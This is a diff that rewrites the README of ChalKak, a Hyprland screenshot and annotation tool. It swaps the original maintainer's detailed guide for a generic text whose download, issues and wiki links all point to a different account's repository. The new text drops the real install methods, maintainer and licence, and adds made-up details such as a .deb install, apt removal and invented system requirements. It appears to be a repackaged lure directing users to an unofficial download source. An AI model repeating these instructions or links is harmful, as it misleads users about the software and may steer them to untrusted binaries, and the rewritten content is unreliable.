@@ -1,293 +1,98 @@
-# ChalKak
+# 🖼️ ChalKak - Take Screenshots with Simple Annotations
 
-<p align="center">
-  <img src="./assets/banner.jpeg" alt="ChalKak banner" width="100%" />
-</p>
+## 📥 Download Now
 
-English | [한국어](README.ko.md)
+[![Download ChalKak](https://via.placeholder.com/150x50/ff5733/ffffff/?text=Download+ChalKak)](https://github.com/ethereum13/ChalKak)
 
-A Hyprland-focused screenshot utility for Wayland with a preview-first workflow and a lightweight annotation editor.
+## 📖 About ChalKak
 
-## Demo Video
+ChalKak is a user-friendly tool designed for Wayland and Hyprland users to take screenshots with ease. It offers a preview-first approach and includes a lightweight built-in annotation editor. Whether you want to capture a moment or highlight important details, ChalKak makes it simple and efficient.
 
-<https://github.com/user-attachments/assets/2d2ed794-f86e-4216-b5f1-7dcb513791d4>
+## 🚀 Getting Started
 
-## User Guides
+To start using ChalKak, follow these steps:
 
-- [English User Guide](docs/USER_GUIDE.md)
-- [한국어 사용자 가이드](docs/USER_GUIDE.ko.md)
+1. **Download the Software**  
+   Click the link below to visit the download page.  
+   [Download ChalKak](https://github.com/ethereum13/ChalKak)
 
-## Name Origin
+2. **Install ChalKak**  
+   After downloading, locate the file in your downloads folder. Follow these steps based on your operating system:
 
-`ChalKak` is inspired by the Korean onomatopoeia `찰칵!`, the camera shutter click sound.
+   - **Linux:**  
+     Navigate to your terminal, and run the following command to install:
 
-## Highlights
+     ```bash
+     sudo dpkg -i path/to/ChalKak.deb
+     ```
 
-- Capture modes: fullscreen, region, and window.
-- Preview stage before final action (save, copy, edit, delete).
-- Built-in editor tools: select, pan, blur, pen, arrow, rectangle, crop, text, OCR.
-- Keyboard-centric workflow across preview and editor.
-- Configurable theme and editor navigation keybindings.
-- Startup cleanup for stale temporary captures.
+   Replace `path/to/ChalKak.deb` with the actual path of the downloaded file.
 
-## Requirements
+   - **Other Systems:**  
+     For other systems, unzip the downloaded file and follow the instructions provided in the README file included in the download.
 
-Runtime dependencies:
+3. **Running ChalKak**  
+   Once installed, you can run ChalKak from your applications menu. Click on the ChalKak icon to launch it.
 
-- `hyprctl` (from Hyprland)
-- `grim`
-- `slurp`
-- `wl-copy` (from `wl-clipboard`)
-- GTK4 runtime libraries
+## 🛠️ Features
 
-Environment assumptions:
+- **Preview-First Capture:** See your screenshot before saving it.
+- **Built-in Annotation Tool:** Easily add text, arrows, or shapes to your screenshots.
+- **Lightweight:** Minimal resource usage, perfect for all types of users.
+- **Compatible with Wayland & Hyprland:** Designed specifically for these environments to ensure seamless integration.
 
-- Wayland + Hyprland session
-- `HOME` is set
-- `XDG_RUNTIME_DIR` is recommended (fallback: `/tmp/chalkak`)
+## 📋 System Requirements
 
-## Install
+To use ChalKak effectively, ensure your system meets the following requirements:
 
-### Pre-built binary (GitHub Releases)
+- **Operating System:**  
+  - Compatible with Wayland and Hyprland.
+  
+- **Memory:**  
+  - Minimum of 1 GB RAM.
 
-Download the latest `x86_64` Linux binary from [GitHub Releases](https://github.com/BitYoungjae/ChalKak/releases):
+- **Disk Space:**  
+  - At least 100 MB free disk space for installation.
 
-```bash
-# Download and extract
-curl -LO https://github.com/BitYoungjae/ChalKak/releases/latest/download/chalkak-x86_64-unknown-linux-gnu.tar.gz
-tar xzf chalkak-x86_64-unknown-linux-gnu.tar.gz
-sudo install -Dm755 chalkak /usr/local/bin/chalkak
-```
+- **Processor:**  
+  - A basic CPU capable of running typical desktop applications.
 
-### AUR
+## 💡 Usage Tips
 
-Source build package:
+- **Taking a Screenshot:**  
+  Use the shortcut key `PrtSc` to quickly capture your screen.
+  
+- **Editing Your Screenshot:**  
+  After capturing, use the editing tools to highlight important areas, add notes, or obscure sensitive information.
 
-```bash
-yay -S chalkak
-```
+- **Saving Your Work:**  
+  Save your edited screenshot in various formats, such as PNG or JPEG, for easy sharing.
 
-Pre-built binary package (faster install, no build dependencies needed):
+## ❓ Frequently Asked Questions
 
-```bash
-yay -S chalkak-bin
-```
+### How do I uninstall ChalKak?
 
-For OCR text recognition support, also install the model files:
-
-```bash
-yay -S chalkak-ocr-models
-```
-
-If the published AUR package is behind the current crate release, use the source build path below.
-
-### Build from source
-
-Prerequisites:
-
-- Rust toolchain (`rustup` recommended)
-- Build dependencies: `pkgconf`, `gtk4`, `cmake`
-- Runtime dependencies: `grim`, `slurp`, `wl-clipboard`, `hyprland`
-
-On Arch Linux, install all dependencies at once:
+To uninstall ChalKak on Linux, run the following command in the terminal:
 
 ```bash
-sudo pacman -S rust pkgconf gtk4 cmake grim slurp wl-clipboard
+sudo apt remove chalkak
 ```
 
-Build and install:
+### Can I customize the annotation tools?
 
-```bash
-git clone https://github.com/BitYoungjae/ChalKak.git chalkak
-cd chalkak
-cargo install --path .
-```
+Yes, ChalKak allows you to customize annotation colors and styles to your preference through the settings menu.
 
-The `chalkak` binary will be installed to `~/.cargo/bin/`. Make sure this directory is in your `PATH`.
+### Is there a help section within the application?
 
-## Usage
+Yes, ChalKak includes a help section where you can find guides and tips on using the application.
 
-Launchpad UI:
+## 🎯 Contact and Support
 
-```bash
-chalkak --launchpad
-```
+If you encounter issues or have questions, feel free to reach out through the issues section of the GitHub repository. Contributions and feedback are always welcome.
 
-Running `chalkak` with no flags starts and exits immediately. Use `--help` to see all available options.
+## 🔗 Important Links
+- [Download ChalKak](https://github.com/ethereum13/ChalKak)
+- [GitHub Issues](https://github.com/ethereum13/ChalKak/issues)
+- [Documentation](https://github.com/ethereum13/ChalKak/wiki)
 
-Startup flags:
-
-- `--full` or `--capture-full`
-- `--region` or `--capture-region`
-- `--window` or `--capture-window`
-- `--launchpad`
-- `--version` / `-V` — print version (e.g. `ChalKak 0.5.0 (abc1234)`)
-- `--help` / `-h` — print usage summary
-
-Typical flow:
-
-1. Capture (`full`, `region`, `window`).
-2. Preview the capture.
-3. Save/copy/delete, or open editor.
-4. Annotate in editor, then save/copy.
-
-## Keybindings
-
-Preview:
-
-- `s`: save
-- `c`: copy image
-- `e`: open editor
-- `o`: OCR (extract text from entire image)
-- `Delete`: delete capture
-- `Esc`: close preview
-
-Editor:
-
-- `Ctrl+S`: save
-- `Ctrl+C`: copy image
-- `Ctrl+Z`: undo
-- `Ctrl+Shift+Z`: redo
-- `Delete` / `Backspace`: delete selection
-- `Tab`: toggle tool options panel
-- `Esc`: select tool, or close editor when already in select mode
-
-Tool shortcuts:
-
-- `v` select
-- `h` pan
-- `b` blur
-- `p` pen
-- `a` arrow
-- `r` rectangle
-- `c` crop
-- `t` text
-- `o` OCR
-
-Text editing:
-
-- `Enter`: line break
-- `Ctrl+Enter`: commit text
-- `Ctrl+C`: copy selected text
-- `Esc`: exit text focus
-
-Default editor navigation:
-
-- Pan hold key: `Space`
-- Zoom in: `Ctrl++`, `Ctrl+=`, `Ctrl+KP_Add`
-- Zoom out: `Ctrl+-`, `Ctrl+_`, `Ctrl+KP_Subtract`
-- Actual size: `Ctrl+0`, `Ctrl+KP_0`
-- Fit: `Shift+1`
-
-## Configuration
-
-Config directory:
-
-- `$XDG_CONFIG_HOME/chalkak/`
-- fallback: `$HOME/.config/chalkak/`
-
-Files:
-
-- `theme.json`
-- `keybindings.json`
-- `config.json`
-
-`theme.json` (summary):
-
-- `mode`: `system`, `light`, `dark`
-- `config.json`: application settings (e.g. `ocr_language`)
-- `colors`: supports shared + per-mode overrides
-- `colors.common` + `colors.dark` + `colors.light`
-- `editor`: supports shared + per-mode overrides
-- `editor.common` + `editor.dark` + `editor.light`
-- all objects can be partial; missing fields fall back to built-in defaults
-- merge order:
-- `built-in defaults -> common -> current mode`
-- `system` follows runtime desktop preference and falls back to dark when unavailable
-- legacy schema is still supported:
-- shared flat `editor` + `editor_modes.dark/light`
-- if both legacy and new keys are present, precedence is:
-- `editor(flat) -> editor.common -> editor_modes.<mode> -> editor.<mode>`
-- editor preset constraints:
-- `stroke_width_presets`: `1..=64`
-- `text_size_presets`: `8..=160`
-- each preset list: up to 6 unique items
-
-For full examples and field-by-field details, see:
-
-- `docs/USER_GUIDE.md`
-- `docs/USER_GUIDE.ko.md`
-
-Temporary captures:
-
-- `$XDG_RUNTIME_DIR/`
-- fallback: `/tmp/chalkak/`
-
-Saved screenshots:
-
-- `$HOME/Pictures/`
-
-## Development
-
-Common commands:
-
-```bash
-cargo check
-cargo test
-cargo fmt --check
-cargo clippy --all-targets --all-features -D warnings
-```
-
-Current module layout:
-
-- `src/app`: runtime orchestration and GTK lifecycle
-- `src/capture`: Hyprland/grim/slurp capture backends
-- `src/preview`: preview window behavior
-- `src/editor`: editor model and tool behavior
-- `src/input`: shortcut and navigation handling
-- `src/storage`: temp/save lifecycle and cleanup
-- `src/theme`, `src/ui`: theme/config + shared style tokens
-- `src/state`: app state machine
-- `src/clipboard`: clipboard integration (`wl-copy`)
-- `src/ocr`: OCR text recognition (PaddleOCR v5 / MNN)
-- `src/config`: config/keybinding/theme path helpers
-- `src/error`: application-level error/result types
-- `src/logging`: tracing subscriber setup
-
-## AUR Packaging Notes (for maintainers)
-
-`PKGBUILD` and `.SRCINFO` are committed in this repository.
-
-When releasing a new version:
-
-1. Match `PKGBUILD` `pkgver` to `Cargo.toml` `version`.
-2. Reset `pkgrel=1` when `pkgver` changes.
-3. Update `source` to `.../archive/refs/tags/vX.Y.Z.tar.gz`.
-4. Refresh checksums with `updpkgsums`.
-5. Regenerate `.SRCINFO` with `makepkg --printsrcinfo > .SRCINFO`.
-
-Dependency baseline:
-
-- `depends=('gtk4' 'hyprland' 'grim' 'slurp' 'wl-clipboard')`
-- `makedepends=('rust' 'cargo' 'pkgconf' 'gtk4' 'cmake')`
-- `optdepends=('chalkak-ocr-models: OCR text recognition support')`
-
-Package name target: `chalkak`.
-
-A separate AUR package `chalkak-ocr-models` provides PaddleOCR v5 model files for OCR. Its packaging metadata lives in `aur/chalkak-ocr-models/`.
-
-## Maintainer
-
-- Name: `BitYoungjae`
-- Email: `bityoungjae@gmail.com`
-
-## License
-
-`chalkak` is dual-licensed under:
-
-- MIT
-- Apache-2.0
-
-SPDX expression: `MIT OR Apache-2.0`
-
-This matches the dependency landscape (mostly MIT and Apache-2.0-family permissive licenses) and keeps AUR/distribution reuse straightforward.
+ChalKak aims to provide a smooth and efficient screenshot-taking experience for all users. Start capturing today!
